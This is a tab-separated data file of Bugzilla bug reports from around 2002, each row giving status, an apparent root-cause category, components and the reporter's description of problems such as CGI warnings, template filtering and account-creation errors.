Id%TAB%Opening%TAB%Reporter%TAB%VerificationStatus%TAB%ResolutionStatus%TAB%RootCauseCategory%TAB%Components%TAB%Description%TAB%FullDescription
538%TAB%904184243%TAB%3791%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%HTML Dialogs,UI,Bugzilla-General%TAB%Bugzilla can't search bug lists for a text match%TAB%Bugzilla can't search bug lists for a text match
539%TAB%904196016%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%MIMELib,UI,Bugzilla-General%TAB%enter_bug.cgi chokes if we have multiple products.%TAB%enter_bug.cgi chokes if we have multiple products.
136156%TAB%1018240572%TAB%45468%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installation & Upgrading,Email Notifications%TAB%system() won't work from .cgi on Windows%TAB%system() won't work from .cgi on WindowsBugzilla 2.14.1, Windows2000, Apache, ActivePerl  All the system() calls from .cgi scripts (like system "processmail.pl") will  not run anything. If it is run from commandline, everything worked fine. If run  from cgi script by the webserver, system() calls just did not execute.  Workaround: Besides renaming the perl scripts to .pl and editing .cgi scripts  to call them (and editing shebang lines) I needed to put cmd.exe into bugzilla  directory and also add "AddHandler cgi-bin .pl" directive into httpd.conf of  Apache.  I know it is not in fact the bug of Bugzilla but ActivePerl and Apache - but it  would save me quite a chunk of time spent debugging if it was written in the  documentation.
136180%TAB%1018250511%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%'FILTER html' used in *.txt.tmpl files instead of 'FILTER uri'%TAB%'FILTER html' used in *.txt.tmpl files instead of 'FILTER uri'The patch for Bug 133423 added 'FILTER html' to variables in:    template/default/token/emailchangenew.txt.tmpl   template/default/token/emailchangeold.txt.tmpl  However, the output of these variables appears as part of a URL and should be filtered using 'uri' instead of 'html'.  Patch to follow shortly.
136225%TAB%1018263461%TAB%14303%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List,User Interface%TAB%Make summary a link in buglists,Make summary a link in buglists (avoids horizontal scrolling)%TAB%Make summary a link in buglists,Make summary a link in buglists (avoids horizontal scrolling)Because horizontal scrolling is a pain, it'd be really nice if the summary was also linked to the bug. As it is, you scroll right to read the summaries, and then you need to scroll all the way left to click the id in order to go to the bug. This gennerally occurs when some of the columns in the buglist are really wide.
136227%TAB%1018263628%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Suite%TAB%Perl syntax in runtests.sh causes error message when passing in arguments%TAB%Perl syntax in runtests.sh causes error message when passing in argumentsWhen '--verbose' is passed into runtests.sh, the following error message occurs:  ./runtests.sh: [: ==: binary operator expected  String equality is '=' under bash.  Patch to follow shortly.
136325%TAB%1018304008%TAB%20977%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%bug_emal.pl uses /usr/bin/perl instead of ...bonsaitools/bin/perl,bug_email.pl uses /usr/bin/perl instead of ...bonsaitools/bin/perl%TAB%bug_emal.pl uses /usr/bin/perl instead of ...bonsaitools/bin/perl,bug_email.pl uses /usr/bin/perl instead of ...bonsaitools/bin/perlSince the default perl is /usr/bonsaitools/bin/perl the perl files in contrib directory sould also use that one. At least bug_email.pl, bugzilla_email_append.pl and gnats2bz.pl use the /usr/bin/perl.
136506%TAB%1018369399%TAB%4672%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%can't create new accounts cvs tip 4/8/02%TAB%can't create new accounts cvs tip 4/8/02Description • 23 years ago using: http://n0cgi.distributed.net/bugs/createaccount.cgi?login=foo%40bar.com&realname=foo+bar  cvs tip bugzilla returns:  Content-type: text/html   Software error:  Attempted to send tainted string 'SELECT eventdata FROM tokens WHERE tokentype = 'emailold' AND eventdata like '%:foo@bar.com' OR eventdata like 'foo@bar.com:%'' to the database at globals.pl line 260.
136533%TAB%1018382118%TAB%47651%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%suggestion for ability to do reports of bug counts on any datasets%TAB%suggestion for ability to do reports of bug counts on any datasetsI will hopefully attach some source code where I have modified "reports.cgi" to display tables containing resolution codes etc from what is selected from the listbox on the previous screen.(the one marked "Chart datasets:") NB To make this more acceptable I may be able to make changes (depending on how busy I am at work)
136596%TAB%1018411236%TAB%48628%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Final "." missing in explanation for "INVALID" in queryhelp.cgi%TAB%Final "." missing in explanation for "INVALID" in queryhelp.cgiLine 209 in queryhelp.cgi reads "<li><b>INVALID</b> - The problem described is not a bug"  it should read "<li><b>INVALID</b> - The problem described is not a bug."
136603%TAB%1018413593%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%xml.cgi needs a summary mode,show_bug.cgi's needs a summary mode,show_bug.cgi's XML retreival needs a summary mode,show_bug.cgi's XML retrieval needs a summary mode%TAB%xml.cgi needs a summary mode,show_bug.cgi's needs a summary mode,show_bug.cgi's XML retreival needs a summary mode,show_bug.cgi's XML retrieval needs a summary modebots don't want every comment, and if you don't want to change data via teh xmlrpc stuff we don't support, you may want to use the shadowdb.  We should have either a mode which allows the user to select what fields they want, and/or a nocomments mode for xml output. This would also be useful when we start dumping attachment data.
136751%TAB%1018449314%TAB%34938%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%warning in show_bug.cgi%TAB%warning in show_bug.cgiOn my test system I receive the folowing warning in show_bug.cgi  Argument "" isn't numeric in numeric gt (>) at (eval 42) line 9 (#1) (W  numeric) The indicated string was fed as an argument to an operator that  expected a numeric value instead. If you're fortunate the message will identify  which operator was so unfortunate. [Thu Apr 11 01:25:39 2002]  C:\DL\Devlopment\BugZilla\current\mozilla\webtools\bugzilla\show_bug.cgi:  Argument "" isn't numeric in numeric gt (>) at (eval 42) line 9. [Thu Apr 11  01:25:39 2002]  C:\DL\Devlopment\BugZilla\current\mozilla\webtools\bugzilla\show_bug.cgi:  Argument "" isn't numeric in numeric gt (>) at (eval 42) line 9.
136754%TAB%1018449749%TAB%34938%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%warning in editproduct.cgi if usebuggroups option is on%TAB%warning in editproduct.cgi if usebuggroups option is onif the usebuggroups option is turned on I receive the folowing warning in  editproducts.cgi when I select a product to edit   Use of uninitialized value in substitution (s///) at CGI.pl line 372 (#1) (W  uninitialized) An undefined value was used as if it were already defined. It  was interpreted as a "" or a 0, but maybe it was a mistake. To suppress this  warning assign a defined value to your variables. To help you figure out what  was undefined, perl tells you what operation you used the undefined value in.  Note, however, that perl optimizes your program and the operation displayed in  the warning may not necessarily appear literally in your program. For  example, "that $foo" is usually optimized into "that " . $foo, and the warning  will refer to the concatenation (.) operator, even though there is no . in your 
136827%TAB%1018485269%TAB%48628%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General,Reporting/Charting%TAB%mailto: value needs appended emailsuffix in describecomponents.cgi and reports.cgi,mailto: value needs appended emailsuffix in reports.cgi%TAB%mailto: value needs appended emailsuffix in describecomponents.cgi and reports.cgi,mailto: value needs appended emailsuffix in reports.cgiI have originally found this bug in report.cgi, "most doomed for milestone", see http://bugzilla.mozilla.org/show_bug.cgi?id=136609 for details.  This is a typical bug of the kind that tends to pop up at several places, so I  did a source code review of 2.14.1.  I asked grep where to look:  wwwrun@develop:/opt/bugzilla-2.14.1> grep -lE 'mailto:.*\$' `find . -type f` ./buglist.cgi ./describecomponents.cgi ./globals.pl ./reports.cgi  From looking at the source code:  buglist.cgi does it right, no bug in that one. describecomponents.cgi does not do it right, so there is an additional bug in  that one. globals.pl does it right, no bug in that one. reports.cgi does not do it right, as was already noticed.  (I repeat reports.cgi here so we can mark 136609 as a duplicate of this one.)
137121%TAB%1018592203%TAB%48628%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%createaccount.cgi emitts "Content-type: text/html" twice,createaccount.cgi emits "Content-type: text/html" twice%TAB%createaccount.cgi emitts "Content-type: text/html" twice,createaccount.cgi emits "Content-type: text/html" twiceOne of the first things createaccount.cgi *always* does is, it clears the  cookies.  In that code, there already is a "Content-type".   Createaccount.cgi then calls CheckEmailSyntax(), which prints "Content-type" a  second time.  That second time is no longer interpreted as a HTTP-Header, so it becomes  visible on the browser screen.
137183%TAB%1018613374%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%userprefs.cgi: tab names should be in the template not in the .cgi%TAB%userprefs.cgi: tab names should be in the template not in the .cgimy @tabs = ( { name => "account", description => "Account settings",                 saveable => "1" },              { name => "email", description => "Email settings",                 saveable => "1" },              { name => "footer", description => "Page footer",                 saveable => "1" },              { name => "permissions", description => "Permissions",                 saveable => "0" } );  The "description" (tab header) should really be in the template/default/pref/userprefs.tmpl. This blocks the translation of the templates: bug 126955 and bug 135604 and is highly user visible.  For the longer term also the error messages need to be moved into a translatable form: DisplayError("I was unable to retrieve your old password from the database."); DisplayError("You did not enter your old password correctly."); DisplayError("The two passwords you entered did not match."); DisplayError("You must enter a new password."); DisplayError("You must enter your old password to change email address."); DisplayError("Email change already in progress; please check your email."); DisplayError("Account $new_login_name already exists"); "An email has been sent to both old and new email addresses to confirm the change of email address."; DisplayError("Hmm, the $name query seems to have gone away.");
137218%TAB%1018625838%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%the email fields on the query form are too small%TAB%the email fields on the query form are too smallThe email fields on the new query form are 20 characters wide.  They used to be 30.  They can be at least 25 without altering the layout of the page and should be at least that wide so there is adequate room for longer email addresses.
137261%TAB%1018660903%TAB%7417%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Email Notifications%TAB%X-Bugzilla-Who: an email header specifying the the bugzilla account that made these changes,X-Bugzilla-Who: an email header specifying the bugzilla account that made these changes%TAB%X-Bugzilla-Who: an email header specifying the the bugzilla account that made these changes,X-Bugzilla-Who: an email header specifying the bugzilla account that made these changesI'd like this header so that I can mark bugmail read if I was the one who made the change, since I probably still remeber what it was that I did.
137589%TAB%1018866721%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Suite%TAB%Tinderbox is stuck waiting for input from CGI.pm in process/verify-new-product.html.tmpl%TAB%Tinderbox is stuck waiting for input from CGI.pm in process/verify-new-product.html.tmplAfter Bug 125660 (Templatise process_bug.cgi) was checked in, the t/004template.t template test gets stuck on the following line from the template/default/process/verify-new-product.html.tmpl template:  [% USE mycgi = CGI %]  It is similar to what happens when this is run from the command-line (hit Ctrl-C or Ctrl-D on *NIX to exit):  perl -e 'use CGI; my $query = new CGI;'  There are two fixes for this:  1. Add a line like this to t/004template.t:  use CGI qw(-no_debug);     Because CGI.pm would already be included in the test script,    including it again in the template has no effect, and the    '-no_debug' switch turns off this feature for testing.  2. Change template/default/process/verify-new-product.html to    include the '-no_debug' switch:  [% USE mycgi = CGI('-no_debug') %]  Any preference as to the fix?
